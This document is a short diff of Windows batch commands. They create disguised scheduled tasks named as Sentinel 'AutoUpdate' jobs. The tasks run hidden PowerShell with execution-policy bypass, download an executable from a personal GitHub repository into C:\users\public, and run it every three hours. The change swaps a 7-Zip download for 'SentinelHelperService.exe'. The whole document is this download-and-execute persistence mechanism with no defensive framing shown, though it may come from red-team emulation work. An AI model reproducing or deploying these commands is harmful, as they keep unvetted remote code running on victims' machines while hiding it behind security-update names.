@@ -1,2 +1,2 @@
-<nul set /p="N" | schtasks /create /tn "\Sentinel\AutoUpdateDef" /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe  -w hidden -NoLogo -NonInteractive -ep bypass -nop -c ''& curl.exe -L http://7-zip.org/a/7z1604-x64.exe --output C:\users\public\7zip.exe''" /sc hourly /mo 3
-<nul set /p="N" | schtasks /create /tn "\Sentinel\AutoUpdateRules" /tr "C:\users\public\7zip.exe" /sc hourly /mo 3
+<nul set /p="N" | schtasks /create /tn "\Sentinel\AutoUpdateDef" /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe  -w hidden -NoLogo -NonInteractive -ep bypass -nop -c ''& curl.exe -L https://github.com/cc0rn/cds/raw/main/SentinelHelperService.exe --output C:\users\public\SentinelHelperService.exe''" /sc hourly /mo 3
+<nul set /p="N" | schtasks /create /tn "\Sentinel\AutoUpdateRules" /tr "C:\users\public\SentinelHelperService.exe" /sc hourly /mo 3
